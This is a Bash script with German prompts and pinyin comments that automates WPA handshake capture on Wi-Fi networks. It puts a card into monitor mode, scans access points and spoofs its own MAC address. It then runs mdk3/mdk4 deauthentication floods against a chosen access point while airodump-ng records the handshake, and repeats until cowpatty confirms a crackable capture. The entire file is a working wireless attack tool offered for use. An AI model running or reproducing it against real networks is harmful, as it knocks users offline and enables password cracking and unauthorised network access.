#!/bin/bash
#
#********************************************************************
#Author:                QianSong
#QQ:                    xxxxxxxx
#Date:                  2022-09-13
#FileName：             handshakes_by_mdk.sh
#URL:                   https://github.com
#Description：          The handshake wifi cap info script
#Copyright (C):         QianSong 2022 All rights reserved
#********************************************************************

#ding yi var
work_dir=$(dirname $(realpath $0))/temp_mdk
result_dir=$(dirname $(realpath $0))/result

#pan duan work_dir shi  fou  cun  zai
if [ ! -d ${work_dir} ];then
	mkdir ${work_dir} -p
fi
#pan duan result_dir shi  fou  cun  zai
if [ ! -d ${result_dir} ];then
	mkdir ${result_dir} -p
fi

#===========================================================================================================================================
#======================                               xian shi  wlan0 info function                             ============================
#===========================================================================================================================================
function show_interface_list() {
#bao cun list to file
rm -rf ${work_dir}/interface_list.txt >/dev/null 2>&1
sleep 2
if_list=$(ip a|egrep "^[0-9]+" |awk -F ":" '{print $2}'|awk '{print $1}'|egrep -v "^lo$")
local i=1
for if_name in ${if_list}
do
	iface_num=$(airmon-ng|awk '/Interface/''{for(i=1; i<=NF; i++){print i " => " $i;}}'|grep "Interface"|awk '{print $1}')
	dri_num=$(airmon-ng|awk '/Driver/''{for(i=1; i<=NF; i++){print i " => " $i;}}'|grep "Driver"|awk '{print $1}')
	if_driver=$(airmon-ng|awk -v iface_num=${iface_num} -v if_name=${if_name} '{if($iface_num==if_name) {print $0}}'|awk -v dri_num=${dri_num} '{print $dri_num}')
	if_usb_id=$(cut -b 5-14 < "/sys/class/net/${if_name}/device/modalias" | sed 's/^.//;s/p/:/'|awk '{print tolower($1)}')
	if_chipest=$(lsusb|awk -v if_usb_id=${if_usb_id} '{if ($6==if_usb_id) {print $0}}'|awk '{for (i=7;i<=NF;i++) printf("%s ", $i); print ""}')
	#if_suport_band=
	echo -e "${i}., ${if_name}, driver: ${if_driver} chipest: ${if_chipest}" >> ${work_dir}/interface_list.txt
	let i++
done
#du qu list from file
while IFS=, read -r if_num if_name if_chipest; do
	echo -e "\033[32m${if_num} ${if_name}\033[0m ${if_chipest}"
done < "${work_dir}/interface_list.txt"
}

#===========================================================================================================================================
#======================                                select wlan card function                             ===============================
#===========================================================================================================================================
function select_interface() {
clear
show_interface_list
echo -ne "\033[33mBitte wählen Sie eine Schnittstelle: \033[0m"
read inface_num
while true
do
	if [ -z "${inface_num}" ] || [ "${inface_num}" == "" ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num kann nicht null sein\033[0m"
		echo -ne "\033[33mBitte wählen Sie eine Schnittstelle: \033[0m"
		read inface_num
	elif [ "${inface_num}" == "0" ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num kann nich 0 sein\033[0m"
		echo -ne "\033[33mBitte wählen Sie eine Schnittstelle: \033[0m"
		read inface_num
	elif [[ ! "${inface_num}" =~ ^[0-9]+$ ]]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num muss ein Zahlentyp sein\033[0m"
		echo -ne "\033[33mBitte wählen Sie eine Schnittstelle: \033[0m"
		read inface_num
	elif [ "${inface_num}" -gt $(cat "${work_dir}/interface_list.txt"|wc -l) ]; then
		clear
		show_interface_list
		echo -e "\033[31mInface_num muss kleiner sein als die Gesamtzahl der Schnittstellenlisten\033[0m"
		echo -ne "\033[33mBitte wählen Sie ein Interface: \033[0m"
		read inface_num
	else
		break
	fi
done

#=====================shu chu ni  de  xuan  zhe  jie  guo====================
wlan_card=$(cat "${work_dir}/interface_list.txt"|awk -F "," "NR==${inface_num}"'{print $2}'|awk '{print $1}')
airmon-ng | grep "${wlan_card}" >/dev/null 2>&1
card_check_status=$?
if [ ${card_check_status} -eq 0 ]; then
	echo -e "\033[35mDie von Ihnen gewählte Schnittstelle ist\033[0m \033[32m[${wlan_card}]\033[0m \033[35mwird unterstütztd\033[0m"
else
	echo -e "\033[35mDie von Ihnen gewählte Schnittstelle ist\033[0m \033[32m[${wlan_card}]\033[0m \033[31mwird nicht unterstützt\033[0m"
	exit 5
fi
ip a |grep "${wlan_card}" >/dev/null 2>&1
interface_status=$?

#pan duan wang ka  shi  fou  kai qi jian  ting
if [ ${interface_status} -eq 0 ];then
	echo -e "\033[33mÜberprüfung der Schnittstelle ${wlan_card} Arbeitsmodus Monitor.....\033[0m"
	iwconfig ${wlan_card}|grep "Mode:Monitor" >/dev/null 2>&1
	monitor_check=$?
	if [ ${monitor_check} -ne 0 ]; then
		echo -e "\033[31mPrüfung fehlgeschlagen\033[0m \033[35mSchnittstelle zum Monintor Mod starten...\033[0m"
		airmon-ng check kill
		check_kill=$?
		ip link set ${wlan_card} down
		if_down=$?
		iw dev ${wlan_card} set type monitor
		if_monitor=$?
		ip link set ${wlan_card} up
		if_up=$?	
		if [ ${check_kill} -eq 0 ] && [ ${if_down} -eq 0 ] && [ ${if_monitor} -eq 0 ] && [ ${if_up} -eq 0 ]; then
			echo -e "\033[32mErfolgreich..\033[0m"
		else
			echo -e "\033[31mfehlgeschlagen..\033[0m"
			exit 6
		fi
	else
		echo -e "\033[32mCHECK OK\033[0m \033[35mDiese Schnittstelle ${wlan_card} ist bereits im monitor mode, fortfahren !\033[0m"
	fi
else
	echo -e "\033[33mEs gibt kein solches Gerät ${wlan_card}, bitte stellen Sie sicher, dass Sie das Gerät eingesteckt haben und dieses normal arbeitet.\033[0m"
	exit 7
fi
}

#===========================================================================================================================================
#========================                             sao miao all ap function                               ===============================
#===========================================================================================================================================
scan_all_ap() {
for i in 1
do
	rm -rf ${work_dir}/dump*
	sleep 2
	xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Alle AP scannen" -e airodump-ng ${wlan_card} --band $1 -w ${work_dir}/dump &
	echo $! >${work_dir}/airodump-ng.pid
	target_pid=$(cat ${work_dir}/airodump-ng.pid)
        pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
        ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
        while [ ${pid_sum} -gt 0 ] || [ ${ppid_sum} -gt 0 ]
	do
		target_pid=$(cat ${work_dir}/airodump-ng.pid)
	       	pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
	       	ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
		sleep 1
	done
	sleep 2
done
}

#===========================================================================================================================================
#================                             chai fen  server_list and client_list function                               =================
#===========================================================================================================================================
prepare_server_client_list() {
rm -rf ${work_dir}/server_list.csv >/dev/null 2>&1
rm -rf ${work_dir}/client_list.csv >/dev/null 2>&1
rm -rf ${work_dir}/client.txt >/dev/null 2>&1
sleep 2
target_line=$(cat ${work_dir}/dump-01.csv|awk '/(^Station[s]?|^Client[es]?)/{print NR}')
target_line=$(awk -v target_line=${target_line} 'BEGIN{print target_line-1}')
cat ${work_dir}/dump-01.csv|head -n ${target_line}|dos2unix|egrep -v --text "^$" > "${work_dir}/server_list.csv"
cat ${work_dir}/dump-01.csv|tail -n +${target_line}|dos2unix|egrep -v --text "^$" > "${work_dir}/client_list.csv"

#zhun bei sniff client list
echo -e "server_mac,server_name" >> "${work_dir}/client.txt"
while IFS=, read -r _ _ _ _ _ server_mac server_name; do
	server_mac_char=${#server_mac}
	if [ ${server_mac_char} -ge 17 ]; then
		server_mac=$(echo ${server_mac} | awk '{gsub(/ /,""); print}')
		echo -e "${server_mac},${server_name}" >> "${work_dir}/client.txt"
	fi
done < "${work_dir}/client_list.csv"
sleep 2
}

#===========================================================================================================================================
#====================                                   xian shi sao miao jie guo function                         =========================
#===========================================================================================================================================
display_result_info() {
server_list_total=$(cat ${work_dir}/server_list.csv|egrep --text -v "SSID,"|egrep --text -v "^$"|wc -l)
if [ ${server_list_total} -gt 0 ]; then
	IFS=$'\n'
	a=1
	for i in $(cat ${work_dir}/server_list.csv|egrep --text -v "SSID,"|egrep --text -v "^$")
	do
		temp_mac=$(echo ${i}|awk -F "," '{print $1}')
		cat ${work_dir}/client.txt|grep --text ${temp_mac} >/dev/null 2>&1
		client_stat=$?
		if [ "${client_stat}" == "0" ]; then
			echo -e "\033[33m[$a]\033[0m \033[32m$i\033[0m"
		else
			echo -e "\033[33m[$a]\033[0m $i"
		fi
		let a++
	done
else
	echo -e "\033[31mKein Netzwerk in der Liste, drücken Sie [enter] zum Neustart eines neuen Hacks\033[0m"
	read -p ">" you_zl
	handshake_menu
fi
}

#===========================================================================================================================================
#============================                          xiu gai wlan car mac addr function                        ===========================
#===========================================================================================================================================
changer_mac_addr() {
ip link set ${wlan_card} down >/dev/null 2>&1
macchanger -r ${wlan_card} >/dev/null 2>&1
ip link set ${wlan_card} up >/dev/null 2>&1
}

#===========================================================================================================================================
#=====================                                  handshake 2.4g and 5g function                              ========================
#===========================================================================================================================================
handshake_bga() {
#shao  miao   wifi  into  text wifi_info.txt
echo "Start des Scannens von Wifi-Informationen in ${work_dir}/dump-01.csv...."

#shu chu cao zuo ti shi info
echo -e "\n"
echo -e "\033[33mHinweis: Wenn das Ziel-WiFi erscheint, schließen Sie das Scanfenster manuell, um zum nächsten Schritt zu gelangen!\033[0m"
scan_all_ap $2

#xian shi sao  miao  jie  guo
dos2unix ${work_dir}/dump-01.csv >/dev/null 2>&1
prepare_server_client_list
clear
display_result_info

#xuan zhe yi  ge  xin hao
read -p "Wählen Sie einen AP, den Sie schütteln möchten [num]: " ap_num
while true
do
	if [ -z ${ap_num} ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num muss eine Zahl sein und darf nicht null sein!!\033[0m"
		read -p "Wählen Sie einen AP, den Sie schütteln möchten [num]: " ap_num
	elif [[ ! ${ap_num} =~ ^[0-9]+$ ]]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num muss eine Zahl sein und darf nicht null sein!!\033[0m"
		read -p "Wählen Sie einen AP, den Sie schütteln möchten [num]: " ap_num
	elif [ ${ap_num} -gt $(cat ${work_dir}/server_list.csv|egrep --text -v "SSID,"|egrep --text -v "^$"|wc -l) ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num Die Gesamtzahl für die AP-Liste ist nicht sehr hoch!!\033[0m"
		read -p "Wählen Sie einen AP, den Sie schütteln möchten [num]: " ap_num
	elif [ ${ap_num} -eq 0 ]; then
		clear
		display_result_info
		echo -e "\033[33mAP_num ist viel groesser wie 0!!\033[0m"
		read -p "Wählen Sie einen AP, den Sie schütteln möchten [num]: " ap_num
	else
		break
	fi
done

#ding yi mu biao  AP mac and xin dao
target_mac=$(cat ${work_dir}/server_list.csv|egrep --text -v "SSID,"|egrep --text -v "^$"|awk -F "," "NR==${ap_num}"'{print $1}')
if [ -z ${target_mac} ] || [ "${target_mac}" == "" ]; then
	echo -e "\033[31mDas Ziel ap mac ist null, das Programm wird jetzt beendet.\033[0m"
	exit 8
fi
target_ap_name=$(cat ${work_dir}/server_list.csv|grep --text "${target_mac}"|awk -F "," '{if (NF>1) {print $(NF-1)}}'|awk '{print $1}')
cur_channel=$(cat ${work_dir}/server_list.csv|grep --text "${target_mac}"|awk '{print $6}'|awk -F "," '{print $1}'|egrep -v "^0$"|egrep -v "-"|egrep -v "[0-9]+e"|sort|uniq -c|sort -nk 1|tail -n 1|awk "NR==1"'{print $2}')

#kai qi  zhua  bao  xterm
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[35mDas Handshake-Programm xterm wurde gestartet.\033[0m"
	sleep 1
	for i in 1
	do
		rm -rf ${result_dir}/${target_mac//:/-}*
		sleep 2
		changer_mac_addr
		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
		echo $! >${work_dir}/airodump-ng.pid
		sleep 2
	done
else
	echo -e "\033[35mDas Handshake-Programm xterm wurde gestartet.\033[0m"
	sleep 1
	for i in 1
	do
		rm -rf ${result_dir}/${target_ap_name}-${target_mac//:/-}*
		sleep 2
		changer_mac_addr
		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_ap_name}-${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
		echo $! >${work_dir}/airodump-ng.pid
		sleep 2
	done
fi

#kai qi gon ji mdk xterm
echo  "${target_mac}" >${work_dir}/black_mac_list.txt
echo  "" >>${work_dir}/black_mac_list.txt
xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${target_mac}" -e $1 ${wlan_card} d -b ${work_dir}/black_mac_list.txt -c ${cur_channel} &
echo $! >${work_dir}/mdk.pid

#shu chu cao zuo ti shi info
echo -e "\n"
echo -e "\033[33mTipp: Wenn das Ziel-WiFi-Handshake-Paket erscheint, schließen Sie das Paketaufnahmefenster manuell, um zum nächsten Schritt zu gelangen! \033[0m"

#guan bi gon ji xterm
sleep 15
echo -e "\033[32mSchliesse mdk Angriff xterm...\033[0m"
cat ${work_dir}/mdk.pid|xargs -i kill {} >/dev/null 2>&1
target_pid=$(cat ${work_dir}/mdk.pid)
pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)     
ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
while [ ${pid_sum} -gt 0 ] || [ ${ppid_sum} -gt 0 ]
do
	target_pid=$(cat ${work_dir}/mdk.pid)
	pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)     
	ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
	sleep 1
done
sleep 2

#guan bi handshake pid de jian ting program
i=1
target_pid=$(cat ${work_dir}/airodump-ng.pid)
pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)     
ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
while [ ${pid_sum} -gt 0 ] || [ ${ppid_sum} -gt 0 ]
do
	target_pid=$(cat ${work_dir}/airodump-ng.pid)
	pid_sum=$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
	ppid_sum=$(ps -ef|awk "NR>1"'{print $3}'|egrep "^${target_pid}$"|grep -v "grep"|wc -l)
	echo -n "Jetzt sind ${i} Sekunden vergangen.."
	echo -ne "\r\r"
	sleep 1
	let i+=1
done
sleep 2
}

#===========================================================================================================================================
#=======================                                    check handshake fuction                                 ========================
#===========================================================================================================================================
handshake_check() {
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[35mPrüfe handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[35m....\033[0m"
	sleep 3
	cowpatty -c -r ${result_dir}/${target_mac//:/-}-01.cap >/dev/null 2>&1
	exit_code=$?
	if [ ${exit_code} -eq 0 ]; then
		echo -e "\033[32mZiel handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[32merfolgreich geprueft \033[0m"
		return 0
	else
		echo -e "\033[31mZiel handshake \033[34m[${result_dir}/${target_mac//:/-}-01.cap]\033[0m \033[31mPruefung fehlgeschlagen \033[0m"
		return 1
	fi
else
	echo -e "\033[35mPruefe handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[35m....\033[0m"
	sleep 3
	cowpatty -c -r ${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap >/dev/null 2>&1
	exit_code=$?
	if [ ${exit_code} -eq 0 ]; then
		echo -e "\033[32mZiel handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[32merfolgreich geprueft \033[0m"
		return 0
	else
		echo -e "\033[31mZiel handshake \033[34m[${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap]\033[0m \033[31mPruefung fehlgeschlagen \033[0m"
		return 1
	fi
fi
}

#===========================================================================================================================================
#========================                                    xian shi jie guo info function                        =========================
#===========================================================================================================================================
display_cap_location() {
if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
	echo -e "\033[36mDer handshake cap wurde gespeichert in [${result_dir}/${target_mac//:/-}-01.cap] \033[0m"
	exit 0
else
	echo -e "\033[36mDer handshake cap wurde gespeichert in [${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap] \033[0m"
	exit 0
fi
}

#===========================================================================================================================================
#===============================                               xuan zhe gon ji mode                       ==================================
#===========================================================================================================================================
handshake_menu() {
echo -e "\033[33mWaehlen Sie das Band aus fuer den handshake\033[0m"
echo -e "\033[36m************************************\033[0m"
echo -e "\033[31m0.        return tool select\033[0m       \033[36m*\033[0m"
echo -e "\033[36m************************************\033[0m"
echo -e "\033[32m1.        2.4G\033[0m                     \033[36m*\033[0m"
echo -e "\033[32m2.        5G\033[0m                       \033[36m*\033[0m"
echo -e "\033[36m************************************\033[0m"
read -p "Bitte auswaehlen: " hand_type
case ${hand_type} in
	0)
		clear
		handshake_tool_menu
		;;
	1)
		clear
		select_interface
		handshake_bga mdk3 bg
		handshake_check
		exit_code=$?
		while [ ${exit_code} -ne 0 ]
		do
			echo -e "\033[35mStarten Sie das Handshake-Programm neu und überprüfen Sie es erneut....\033[0m"
			sleep 3
			handshake_bga mdk3 bg
			handshake_check
			exit_code=$?
		done
		display_cap_location
		;;
	2)
		clear
		select_interface
		handshake_bga mdk4 a
		handshake_check
		exit_code=$?
		while [ ${exit_code} -ne 0 ]
		do
			echo -e "\033[35Starten Sie das Handshake-Programm neu und überprüfen Sie es erneut....\033[0m"
			sleep 3
			handshake_bga mdk4 a
			handshake_check
			exit_code=$?
		done
		display_cap_location
		;;
	*)
		clear
		handshake_menu
		;;
esac
}

#function ru kou
handshake_menu
